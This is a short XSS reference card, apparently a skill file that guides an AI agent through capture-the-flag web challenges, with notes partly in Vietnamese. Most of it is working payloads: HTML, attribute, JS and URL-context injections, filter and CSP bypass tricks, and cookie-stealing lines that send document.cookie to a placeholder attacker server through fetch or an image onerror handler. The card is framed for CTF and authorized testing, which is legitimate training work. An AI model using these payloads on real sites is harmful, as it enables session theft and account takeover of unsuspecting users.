---
name: web-xss
description: >
  Cross-Site Scripting. Use when user input reaches HTML/JS/attribute/DOM.
  In CTF, XSS usually needs an admin-bot to fire it → goal is exfil to your
  server or CSP bypass. Reference card — pull references/ per context.
tags: [web, xss, reflected, stored, dom, scripting]
environment: [ctf, lab, authorized-testing]
budget:
  stuck_threshold: 3
  on_stuck: pivot
  stop_conditions:
    - "context unchanged after 2 payload variants"
    - "no reflection/sink point identified"
---

# XSS — Reference Card

## Step 0 — jeopardy shape
Thường có **admin-bot** ghé URL bạn nộp → mục tiêu không phải `alert(1)` mà **exfil cookie/flag
về server bạn**. Xác định: flag nằm ở cookie admin? DOM? trang admin-only bot mới xem được?

## Recognize context (quyết định payload)
Gửi marker `UNIQUE123`, xem nó rơi vào context nào — đây là bước quan trọng nhất:
| Context | First payload | Depth |
|---|---|---|
| HTML body | `<svg onload=alert(1)>` `<img src=x onerror=alert(1)>` | `references/html-context.md` |
| HTML attribute | `" onmouseover=alert(1) x="` `" autofocus onfocus=alert(1)` | `references/attribute-context.md` |
| trong `<script>` / JS var | `';alert(1)//` `</script><script>alert(1)</script>` | `references/js-context.md` |
| URL attr (href/src) | `javascript:alert(1)` | `references/html-context.md` |
| DOM (source→sink) | grep source `location/hash/name` → `innerHTML/eval/document.write` | `references/dom-xss.md` |

## Exfil (khi bot fire — CTF)
`<script>fetch('//<you>/?c='+document.cookie)</script>` ·
`<img src=x onerror="this.src='//<you>/?c='+document.cookie">` (chạy listener bắt request).

## Filter/CSP bypass
Case (`<ScRiPt>`), encoding (html-entity/unicode/`%xx`), no-paren (`onerror=alert\`1\``),
no-alert (`confirm`/`print`/`console.log`). CSP: dùng script `'self'` sẵn có / nonce lộ / JSONP.
Chi tiết: `references/filter-bypass.md`, `references/exfil-methods.md`.

## Pull thêm payload
Đọc thêm biến thể trong `../ctf-web/client-side.md`.

## Discipline (../LOOP_DISCIPLINE.md)
- Xác định CONTEXT trước, chọn payload theo context — không spam payload đủ loại.
- Context không đổi sau 2 biến thể → sai điểm reflect hoặc bị encode hết → đổi hướng.
